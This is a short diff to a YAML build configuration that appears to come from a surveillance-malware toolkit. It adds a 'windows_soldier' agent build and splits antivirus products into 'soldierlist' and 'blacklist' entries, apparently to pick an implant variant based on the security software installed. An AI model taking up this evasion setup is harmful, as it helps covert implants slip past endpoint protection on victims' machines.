@@ -1,5 +1,7 @@
 
-blacklist: [iobit32,bitdef,comodo,gdata,drweb,emsisoft,sophos,360cn,360cn5,kis32,avg,avg32]
+soldierlist: [iobit32,bitdef,comodo,gdata,drweb,360cn,360cn5,kis32,avg,avg32]
+blacklist: [emsisoft,sophos]
+
 crop_whitelist: [kis,kis32]
 
 backend: 192.168.100.201
@@ -30,6 +32,14 @@ build_parameters:
           platform_type: desktop
           binary: {admin: false, demo: false}
           melt: {admin: false, bit64: true, codec: true, scout: false}
+          platform: windows
+          meltfile: assets/windows/meltapp.exe
+          sign: {}
+          package: {}
+        windows_soldier:
+          platform_type: desktop
+          binary: {admin: false, demo: false}
+          melt: {admin: false, bit64: true, codec: true, scout: false, soldier: true}
           platform: windows
           meltfile: assets/windows/meltapp.exe
           sign: {}
